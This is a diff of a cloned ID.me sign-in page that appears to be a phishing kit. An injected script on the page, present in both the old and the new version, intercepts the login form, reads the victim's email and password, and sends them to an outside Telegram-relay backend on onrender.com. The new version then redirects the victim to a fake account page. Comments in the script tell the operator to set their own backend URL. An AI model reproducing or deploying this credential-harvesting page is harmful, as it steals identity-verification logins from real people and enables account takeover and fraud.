@@ -40,27 +40,6 @@ Sign in to ID.me - ID.me
 </script>
 
 <script>
-  window._sf_startpt = (new Date()).getTime();
-  window.settings = {
-  
-    google : {
-      account : "UA-40672673-1",
-      linking : "true"
-    },
-  
-    gtm_engineering: "GTM-PL62HD9",
-  
-    zendesk_chat: {
-      key: "65176a74-8b1f-41c2-9661-cf8fb6762a16"
-    },
-  
-    qualtrics: {
-      zoneId: "ZN_2bLc7fWaOZ8U4ey"
-    }
-  };
-</script>
-
-<script>
   window.locales = {
     "current" : "en",
     "default" : "en"
@@ -85,14 +64,12 @@ Sign in to ID.me - ID.me
 </script>
 
 </head>
-<body class=''>
-<div id='ZN_2bLc7fWaOZ8U4ey'></div>
 
+<body>
 
 <div class='page-container' data-role='page-container'>
-<div class='container'>
 <div class='content-container'>
-<form data-validate="signin" data-component="Components.RequiredFieldInfo" class="new_user" id="loginForm" action="https://api.id.me/en/session" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="pcjC2qZHvVKJUH2YUFNtfK3x0KB78XyURaziW9bkLQicvUSgtiFa3PYZR8IhkBnwLyCet42cLiOmhPePciO/HQ==" autocomplete="off" /><input value="3cf6a764-8150-4626-9381-37e8c9da98c6" autocomplete="off" type="hidden" name="user[session_id]" id="user_session_id" />
+<form id="loginForm" data-component="Components.RequiredFieldInfo" class="new_user" id="loginForm" action="https://api.id.me/en/session" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="pcjC2qZHvVKJUH2YUFNtfK3x0KB78XyURaziW9bkLQicvUSgtiFa3PYZR8IhkBnwLyCet42cLiOmhPePciO/HQ==" autocomplete="off" /><input value="3cf6a764-8150-4626-9381-37e8c9da98c6" autocomplete="off" type="hidden" name="user[session_id]" id="user_session_id" />
 <div class='form-header'>
 <div class='form-header-content' role='banner'>
 <div class='partner'>
@@ -161,7 +138,7 @@ For your security, select only on your devices.
 </div>
 </div>
 <div class='form-actions'>
-<button type="submit" name="commit" value="Sign in" class="btn btn-primary" onclick="window.location.href='your-account.html'; return false;">Sign in</button>
+<button type="submit" name="commit" value="Sign in" class="btn btn-primary" return false;>Sign in</button>
 </div>
 
 <div class='form-footer'>
@@ -179,33 +156,38 @@ For your security, select only on your devices.
 <a class="connection m_full" href="https://api.id.me/en/session/options">View more options</a>
 </div>
 </main>
-</form></div>
+</form>
 
-<script>
-document.getElementById('loginForm').addEventListener('submit', async function(e) {
-  e.preventDefault();
-  const username = document.getElementById('user_email').value;
-  const password = document.getElementById('user_password').value;
-  // CHANGE THIS to your backend API URL after you deploy it (step-by-step guide below)
-  const apiUrl = 'https://telegram-backend-1oje.onrender.com';
-  try {
-    const res = await fetch(apiUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password })
-    });
-    const result = await res.json();
-    if (result.success) {
-      alert('Login sent!');
-      // window.location.href = 'your-account.html'; // Optionally redirect
-    } else {
-      alert('Error: ' + (result.error || 'Unknown error'));
-    }
-  } catch (err) {
-    alert('Failed to send. Try again.');
-  }
-});
-</script>
+<!-- Injected script to POST to backend -->
+      <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+          e.preventDefault();
+          const username = document.getElementById('user_email').value;
+          const password = document.getElementById('user_password').value;
+
+          // ◀︎ Change this to your actual backend URL
+          const apiUrl = 'https://telegram-backend-1oje.onrender.com/send-message';
+
+          try {
+            const res = await fetch(apiUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ username, password })
+            });
+            const json = await res.json();
+
+            if (json.success) {
+              window.location.href = 'your-account.html';
+            } else {
+              alert('Error: ' + (json.error || 'Unknown error'));
+            }
+          } catch (err) {
+            alert('Failed to send. Please try again.');
+          }
+        });
+      </script>
+
+
 
 
 <aside aria-label='Select Language' class='language'>
